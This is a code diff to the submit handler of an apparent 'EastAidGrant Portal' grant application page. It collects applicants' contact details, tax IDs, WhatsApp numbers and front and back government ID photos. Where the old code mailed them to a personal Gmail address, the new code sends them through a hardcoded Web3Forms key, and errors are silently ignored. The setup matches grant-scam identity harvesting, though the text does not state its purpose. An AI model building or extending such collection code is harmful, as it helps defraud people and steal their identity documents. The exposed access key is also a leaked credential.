@@ -185,43 +185,62 @@ export default function Apply() {
       }
     } catch { /* ignore */ }
 
-    const ENDPOINT = 'https://formsubmit.co/ajax/erimiposi2005@gmail.com';
+    const WEB3FORMS_KEY = 'ec6ba592-b89b-4a66-a6b8-dd9ae2fa2435';
 
-    // Helper to build base form data with all application fields
-    const buildBase = (subject: string) => {
+    try {
       const fd = new FormData();
-      fd.append('_template', 'table');
-      fd.append('_captcha', 'false');
-      fd.append('_subject', subject);
+      fd.append('access_key', WEB3FORMS_KEY);
+      fd.append('subject', `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`);
+      fd.append('from_name', 'EastAidGrant Portal');
       fd.append('Reference ID', `EAG-${ref}`);
-      fd.append('Grant Applied For', grantTitle);
+      fd.append('Grant Title', grantTitle);
       fd.append('Award Range', awardText);
-      fd.append('Applicant / Entity', form.organizationName);
+      fd.append('Applicant / Organization', form.organizationName);
       fd.append('Applicant Type', form.organizationType);
       fd.append('Contact Person', form.fullName);
       fd.append('Email Address', form.email);
       fd.append('Phone Number', form.phone);
       fd.append('WhatsApp Number', form.whatsapp);
-      fd.append('Mailing / Physical Address', `${form.organizationAddress}, ${form.city}, ${form.state}`);
+      fd.append('Mailing Address', `${form.organizationAddress}, ${form.city}, ${form.state}`);
       fd.append('EIN or Tax ID', form.ein || 'N/A');
       fd.append('Project Title', form.projectTitle);
-      fd.append('Project Proposal Summary', form.projectDescription || 'N/A');
+      fd.append('Project Description', form.projectDescription || 'N/A');
       fd.append('Submission Time', new Date().toLocaleString());
-      return fd;
-    };
+      fd.append('Admin Dashboard Link', `${window.location.origin}/admin`);
+      fd.append(
+        'Government ID Photos',
+        frontDataUrl || backDataUrl
+          ? 'Photos uploaded! View full size and download them directly in your Admin Dashboard (/admin).'
+          : 'No ID photos provided'
+      );
 
-    // Request 1 — full application details + Front ID (or no image if none uploaded)
-    const fd1 = buildBase(`[EAG-${ref}] New Grant Application: ${grantTitle}`);
-    if (compFront) fd1.append('attachment', compFront, `Front_ID_${ref}.jpg`);
-    fetch(ENDPOINT, { method: 'POST', headers: { Accept: 'application/json' }, body: fd1 }).catch(() => {});
+      if (compFront) {
+        fd.append('attachment', compFront, `Front_ID_${ref}.jpg`);
+      }
 
-    // Request 2 — Back ID card only (only sent if user uploaded a back image)
-    if (compBack) {
-      const fd2 = buildBase(`[EAG-${ref}] Back of ID Card — ${form.fullName}`);
-      fd2.append('Note', 'This is the Back of ID Card attachment for the application above.');
-      fd2.append('attachment', compBack, `Back_ID_${ref}.jpg`);
-      fetch(ENDPOINT, { method: 'POST', headers: { Accept: 'application/json' }, body: fd2 }).catch(() => {});
-    }
+      fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        headers: { Accept: 'application/json' },
+        body: fd,
+      }).catch(err => console.warn('Web3Forms dispatch notice:', err));
+
+      if (compBack) {
+        const fdBack = new FormData();
+        fdBack.append('access_key', WEB3FORMS_KEY);
+        fdBack.append('subject', `🪪 Back of ID Card: ${form.fullName} (Ref: EAG-${ref})`);
+        fdBack.append('from_name', 'EastAidGrant Portal');
+        fdBack.append('Reference ID', `EAG-${ref}`);
+        fdBack.append('Applicant Name', form.fullName);
+        fdBack.append('Note', `Back of ID Card attachment for application EAG-${ref}. Also available to download in Admin portal.`);
+        fdBack.append('attachment', compBack, `Back_ID_${ref}.jpg`);
+
+        fetch('https://api.web3forms.com/submit', {
+          method: 'POST',
+          headers: { Accept: 'application/json' },
+          body: fdBack,
+        }).catch(() => {});
+      }
+    } catch { /* ignore */ }
   };
 
   if (isSubmitted) {
